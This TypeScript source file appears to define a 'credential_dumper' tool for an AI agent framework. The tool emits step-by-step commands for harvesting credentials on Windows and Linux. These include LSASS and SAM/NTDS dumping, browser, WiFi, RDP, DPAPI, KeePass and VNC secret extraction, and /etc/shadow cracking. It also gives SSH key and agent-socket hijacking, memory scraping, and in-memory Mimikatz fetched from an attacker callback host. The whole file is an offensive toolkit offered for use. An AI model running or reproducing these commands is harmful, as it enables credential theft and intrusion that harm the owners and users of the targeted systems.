import { Tool } from "./tool"
import z from "zod"

const DESCRIPTION =
  "Cross-platform credential dumper: provides commands and techniques to extract credentials from Linux and Windows systems."

const PARAMETERS = z.object({
  platform: z.enum(["linux", "windows", "auto", "all"]).optional().describe("Target platform (auto-detect if omitted)"),
  target: z
    .enum([
      "all",
      "lsass",
      "sam",
      "ntds",
      "shadow",
      "ssh_keys",
      "browser",
      "wifi",
      "rdp",
      "dpapi",
      "memory",
      "cached",
      "putty",
      "winscp",
      "filezilla",
      "outlook",
      "vnc",
      "moba",
      "keepass",
      "all_browsers",
    ])
    .optional()
    .describe("Specific credential target"),
  output_format: z
    .enum(["commands", "script", "both"])
    .optional()
    .describe("Output as manual commands or automated script"),
  lhost: z.string().optional().describe("Exfiltration callback IP for automated scripts"),
})

export const CredentialDumperTool = Tool.define("credential_dumper", async () => ({
  description: DESCRIPTION,
  parameters: PARAMETERS,
  async execute(params, ctx): Promise<{ title: string; output: string; metadata: Record<string, any> }> {
    const platform =
      params.platform || (process.platform === "win32" ? "windows" : process.platform === "darwin" ? "macos" : "linux")
    const target = params.target || "all"
    const fmt = params.output_format || "commands"
    const lhost = params.lhost || "10.10.14.5"
    let output = ""

    if (platform === "windows" || platform === "all") {
      output += `# Windows Credential Dumper\n\n`

      if (target === "all" || target === "lsass") {
        output += `## LSASS Dump\n\n`
        output += `### Method 1: Task Manager (GUI, requires local access)\n`
        output += `1. Open Task Manager (Ctrl+Shift+Esc)\n`
        output += `2. Find \`lsass.exe\` → Right click → Create dump file\n`
        output += `3. Copy dump to attack box\n`
        output += `4. \`pypykatz lsa minidump lsass.DMP\`\n\n`

        output += `### Method 2: procdump (requires SeDebugPrivilege)\n`
        output += `\`\`\`cmd\n`
        output += `procdump.exe -accepteula -ma lsass.exe lsass.dmp\n`
        output += `\`\`\`\n\n`

        output += `### Method 3: comsvcs.dll (built-in, no external tools)\n`
        output += `\`\`\`powershell\n`
        output += `# Find LSASS PID:\n`
        output += `Get-Process lsass | Select-Object Id\n`
        output += `# Dump (replace PID):\n`
        output += `rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <PID> C:\\Windows\\Temp\\lsass.dmp full\n`
        output += `\`\`\`\n\n`

        output += `### Method 4: PowerShell (elevated)\n`
        output += `\`\`\`powershell\n`
        output += `$p = Get-Process lsass\n`
        output += `[Reflection.Assembly]::LoadWithPartialName("Microsoft.Diagnostics.Runtime")  \n`
        output += `# Use procdump equivalent:\n`
        output += `Invoke-WebRequest "http://${lhost}:8080/procdump.exe" -OutFile "$env:TEMP\\p.exe"\n`
        output += `& "$env:TEMP\\p.exe" -accepteula -ma $p.Id "$env:TEMP\\lsass.dmp"\n`
        output += `\`\`\`\n\n`

        output += `### Extract from dump\n`
        output += `\`\`\`bash\n`
        output += `# On attacker machine:\n`
        output += `pypykatz lsa minidump lsass.dmp\n`
        output += `mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords" exit\n`
        output += `\`\`\`\n\n`
      }

      if (target === "all" || target === "sam") {
        output += `## SAM Dump\n\n`
        output += `### Method 1: Registry Save (elevated)\n`
        output += `\`\`\`cmd\n`
        output += `reg save HKLM\\SAM C:\\Windows\\Temp\\sam.save\n`
        output += `reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.save\n`
        output += `\`\`\`\n\n`

        output += `### Method 2: Volume Shadow Copy\n`
        output += `\`\`\`cmd\n`
        output += `vssadmin create shadow /for=C:\n`
        output += `copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM C:\\temp\\sam\n`
        output += `copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\temp\\system\n`
        output += `\`\`\`\n\n`

        output += `### Extract hashes\n`
        output += `\`\`\`bash\n`
        output += `# On attacker machine:\n`
        output += `samdump2 SYSTEM SAM\n`
        output += `impacket-secretsdump -sam SAM -system SYSTEM LOCAL\n`
        output += `\`\`\`\n\n`
      }

      if (target === "all" || target === "ntds") {
        output += `## NTDS.dit Dump (Domain Controller)\n\n`
        output += `### Method 1: ntdsutil (built-in)\n`
        output += `\`\`\`cmd\n`
        output += `ntdsutil "ac i ntds" "ifm" "create full C:\\Windows\\Temp\\ntds" q q\n`
        output += `\`\`\`\n\n`

        output += `### Method 2: Volume Shadow Copy\n`
        output += `\`\`\`cmd\n`
        output += `vssadmin create shadow /for=C:\n`
        output += `copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\temp\\ntds.dit\n`
        output += `\`\`\`\n\n`

        output += `### Extract\n`
        output += `\`\`\`bash\n`
        output += `impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL\n`
        output += `\`\`\`\n\n`
      }

      if (target === "all" || target === "browser" || target === "all_browsers") {
        output += `## Browser Saved Credentials\n\n`
        output += `### Chrome / Edge / Brave (Chromium-based)\n`
        output += `\`\`\`powershell\n`
        output += `# Decrypt Chrome passwords (requires user context):\n`
        output += `$path = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data"\n`
        output += `# Use lazagne.exe or SharpChrome:\n`
        output += `SharpChrome.exe logins /browser:chrome\n`
        output += `\`\`\`\n\n`

        output += `### Firefox\n`
        output += `\`\`\`powershell\n`
        output += `# Path:\n`
        output += `dir "$env:APPDATA\\Mozilla\\Firefox\\Profiles\\*\\logins.json"\n`
        output += `dir "$env:APPDATA\\Mozilla\\Firefox\\Profiles\\*\\key4.db"\n`
        output += `# Decrypt: python3 firefox_decrypt.py <profile_dir>\n`
        output += `\`\`\`\n\n`

        output += `### All Browsers (Automated)\n`
        output += `\`\`\`powershell\n`
        output += `# Lazagne — all-in-one browser credential stealer\n`
        output += `lazagne.exe browsers\n`
        output += `# SharpWeb — .NET browser credential tool\n`
        output += `SharpWeb.exe all\n`
        output += `\`\`\`\n\n`
      }

      if (target === "all" || target === "wifi") {
        output += `## WiFi Passwords\n\n`
        output += `\`\`\`cmd\n`
        output += `# List saved networks:\n`
        output += `netsh wlan show profiles\n`
        output += `# Show key for specific network:\n`
        output += `netsh wlan show profile name="SSID_NAME" key=clear\n`
        output += `\`\`\`\n\n`

        output += `\`\`\`powershell\n`
        output += `# PowerShell one-liner — dump all:\n`
        output += `(netsh wlan show profiles) | Select-String "\\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\\W+\\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize\n`
        output += `\`\`\`\n\n`
      }

      if (target === "all" || target === "rdp") {
        output += `## RDP Saved Credentials\n\n`
        output += `\`\`\`cmd\n`
        output += `# List saved RDP connections:\n`
        output += `cmdkey /list\n`
        output += `# Enumerate stored RDP credentials:\n`
        output += `dir /a %userprofile%\\AppData\\Local\\Microsoft\\Credentials\\*\n`
        output += `# Decrypt with Mimikatz:\n`
        output += `mimikatz.exe "dpapi::cred /in:%userprofile%\\AppData\\Local\\Microsoft\\Credentials\\<FILE>" exit\n`
        output += `\`\`\`\n\n`
      }

      if (target === "all" || target === "dpapi") {
        output += `## DPAPI (Data Protection API)\n\n`
        output += `\`\`\`powershell\n`
        output += `# DPAPI master key location (requires user context):\n`
        output += `dir "$env:APPDATA\\Microsoft\\Protect\\*\\*" -Hidden\n`
        output += `# Decrypt with Mimikatz:\n`
        output += `mimikatz.exe "dpapi::masterkey /in:<MASTERKEY_FILE> /rpc" "dpapi::cred /in:<CRED_FILE>" exit\n`
        output += `\`\`\`\n\n`
      }

      if (target === "all" || target === "putty") {
        output += `## PuTTY Saved Sessions\n\n`
        output += `\`\`\`powershell\n`
        output += `# PuTTY sessions stored in registry:\n`
        output += `reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\n`
        output += `\`\`\`\n\n`
      }

      if (target === "all" || target === "winscp") {
        output += `## WinSCP Saved Credentials\n\n`
        output += `\`\`\`powershell\n`
        output += `# Registry:\n`
        output += `reg query "HKCU\\Software\\Martin Prikryl\\WinSCP 2\\Sessions"\n`
        output += `# INI file (if using portable):\n`
        output += `type "$env:APPDATA\\WinSCP.ini" 2>nul\n`
        output += `# Decrypt with SharpDPAPI:\n`
        output += `SharpDPAPI.exe winscp\n`
        output += `\`\`\`\n\n`
      }

      if (target === "all" || target === "vnc") {
        output += `## VNC Passwords\n\n`
        output += `\`\`\`powershell\n`
        output += `# TightVNC:\n`
        output += `reg query "HKLM\\SOFTWARE\\TightVNC\\Server"\n`
        output += `# RealVNC:\n`
        output += `reg query "HKCU\\Software\\RealVNC\\vncserver"\n`
        output += `# UltraVNC — password in ultravnc.ini:\n`
        output += `type "C:\\Program Files\\uvnc bvba\\UltraVNC\\ultravnc.ini"\n`
        output += `\`\`\`\n\n`
      }

      if (target === "all" || target === "outlook") {
        output += `## Outlook / Exchange\n\n`
        output += `\`\`\`powershell\n`
        output += `# Outlook profiles:\n`
        output += `dir "$env:LOCALAPPDATA\\Microsoft\\Outlook\\*.ost" -Force\n`
        output += `# Extract with pypykatz:\n`
        output += `pypykatz.exe lsa minidump lsass.dmp\n`
        output += `\`\`\`\n\n`
      }

      if (target === "all" || target === "memory") {
        output += `## Memory Dump (Mimikatz in-memory)\n\n`
        output += `\`\`\`powershell\n`
        output += `# Invoke-Mimikatz (in-memory, no disk write):\n`
        output += `IEX (New-Object Net.WebClient).DownloadString('http://${lhost}:8080/Invoke-Mimikatz.ps1')\n`
        output += `Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::secrets" "lsadump::cache" "token::elevate" "vault::cred /patch"'\n`
        output += `\`\`\`\n\n`
      }

      if (target === "all" || target === "keepass") {
        output += `## KeePass\n\n`
        output += `\`\`\`powershell\n`
        output += `# Dump KeePass process memory (if unlocked):\n`
        output += `procdump.exe -ma KeePass.exe kp.dmp\n`
        output += `# Extract with KeeThief or keepass-dump:\n`
        output += `python3 keepass_dump.py kp.dmp\n`
        output += `\`\`\`\n\n`
      }

      output += `\n---\n\n`
    }

    if (platform === "linux" || platform === "all") {
      output += `# Linux Credential Dumper\n\n`

      if (target === "all" || target === "shadow") {
        output += `## /etc/shadow & /etc/passwd\n\n`
        output += `\`\`\`bash\n`
        output += `# Read shadow (requires root or unshadow):\n`
        output += `cat /etc/shadow\n`
        output += `cat /etc/passwd\n`
        output += `# Combine for cracking:\n`
        output += `unshadow /etc/passwd /etc/shadow > hashes.txt\n`
        output += `# Crack:\n`
        output += `hashcat -m 1800 hashes.txt rockyou.txt --force\n`
        output += `john hashes.txt --wordlist=rockyou.txt\n`
        output += `\`\`\`\n\n`

        output += `### Readable shadow as non-root?\n`
        output += `\`\`\`bash\n`
        output += `ls -la /etc/shadow\n`
        output += `# If readable, grab it:\n`
        output += `cat /etc/shadow\n`
        output += `\`\`\`\n\n`
      }

      if (target === "all" || target === "ssh_keys") {
        output += `## SSH Keys\n\n`
        output += `\`\`\`bash\n`
        output += `# Find all private keys:\n`
        output += `find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" -o -name "*.pem" 2>/dev/null | grep -v ".pub"\n`
        output += `grep -r "BEGIN RSA PRIVATE KEY" /home/ /root/ /opt/ 2>/dev/null\n`
        output += `# Check user home dirs:\n`
        output += `ls -la ~/.ssh/id_*\n`
        output += `ls -la /root/.ssh/id_*\n`
        output += `ls -la /home/*/.ssh/id_*\n`
        output += `# Agent forwarding hijack:\n`
        output += `echo \$SSH_AUTH_SOCK\n`
        output += `SSH_AUTH_SOCK=/tmp/ssh-*/agent.* ssh-add -l\n`
        output += `\`\`\`\n\n`
      }

      if (target === "all" || target === "browser" || target === "all_browsers") {
        output += `## Browser Credentials\n\n`
        output += `### Chrome / Chromium\n`
        output += `\`\`\`bash\n`
        output += `# SQLite database:\n`
        output += `sqlite3 ~/.config/google-chrome/Default/Login\\ Data "SELECT origin_url, username_value, password_value FROM logins;"\n`
        output += `# Lazagne:\n`
        output += `python3 laZagne.py browsers\n`
        output += `\`\`\`\n\n`

        output += `### Firefox\n`
        output += `\`\`\`bash\n`
        output += `# Profile directory:\n`
        output += `ls ~/.mozilla/firefox/*.default*/\n`
        output += `# Decrypt:\n`
        output += `python3 firefox_decrypt.py ~/.mozilla/firefox/<profile>/\n`
        output += `\`\`\`\n\n`
      }

      if (target === "all" || target === "memory") {
        output += `## Process Memory Scraping\n\n`
        output += `\`\`\`bash\n`
        output += `# Dump process memory:\n`
        output += `gdb -p <PID> -batch -ex "gcore /tmp/proc.dump"\n`
        output += `# Search for strings (passwords, keys, tokens):\n`
        output += `strings /proc/<PID>/mem | grep -i "pass\|key\|token\|secret\|jwt\|api\|password="\n`
        output += `# Check SSH agent processes:\n`
        output += `cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n' | grep -i ssh\n`
        output += `\`\`\`\n\n`
      }

      if (target === "all" || target === "cached") {
        output += `## Cached Credentials\n\n`
        output += `\`\`\`bash\n`
        output += `# History files:\n`
        output += `cat ~/.bash_history ~/.zsh_history ~/.mysql_history ~/.psql_history ~/.python_history 2>/dev/null | grep -i "pass\|password\|mysql\|psql\|ssh\|scp\|curl.*Authorization\|wget.*password"\n`
        output += `# Config files with creds:\n`
        output += `find / -name "*.conf" -o -name "*.ini" -o -name "*.env" -o -name "*.yml" -o -name "*.yaml" 2>/dev/null | xargs grep -li "pass\|password\|secret\|key\|token\|api_key" 2>/dev/null | head -20\n`
        output += `# Git repos:\n`
        output += `find / -name ".git-credentials" 2>/dev/null\n`
        output += `find / -name ".gitconfig" 2>/dev/null | xargs grep "helper\|user\|password" 2>/dev/null\n`
        output += `\`\`\`\n\n`
      }

      if (target === "all" || target === "wifi") {
        output += `## WiFi Credentials\n\n`
        output += `\`\`\`bash\n`
        output += `# NetworkManager:\n`
        output += `ls /etc/NetworkManager/system-connections/\n`
        output += `cat /etc/NetworkManager/system-connections/*.nmconnection | grep -E "ssid|psk"\n`
        output += `# wpa_supplicant:\n`
        output += `cat /etc/wpa_supplicant/wpa_supplicant.conf\n`
        output += `\`\`\`\n\n`
      }

      output += `\n---\n\n`
    }

    output += `# Multi-Tool Approach\n\n`
    output += `## Lazagne (Cross-Platform)\n`
    output += `\`\`\`bash\n`
    output += `# Supports: browsers, wifi, sysadmin, chats, databases, games, mail, git, svn, etc.\n`
    output += `python3 laZagne.py all\n`
    output += `laZagne.exe all     # Windows\n`
    output += `\`\`\`\n\n`

    output += `## Mimikatz (Windows)\n`
    output += `\`\`\`\n`
    output += `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit\n`
    output += `\`\`\`\n\n`

    output += `## Pypykatz (Python — no AV flags)\n`
    output += `\`\`\`bash\n`
    output += `pypykatz lsa minidump lsass.dmp\n`
    output += `pypykatz registry --sam SAM --security SECURITY SYSTEM\n`
    output += `\`\`\`\n\n`

    return {
      title: `Credential Dumper: ${platform} (${target})`,
      output,
      metadata: {
        action: "credential_dumper",
        platform,
        target,
        format: fmt,
      } as Record<string, any>,
    }
  },
}))
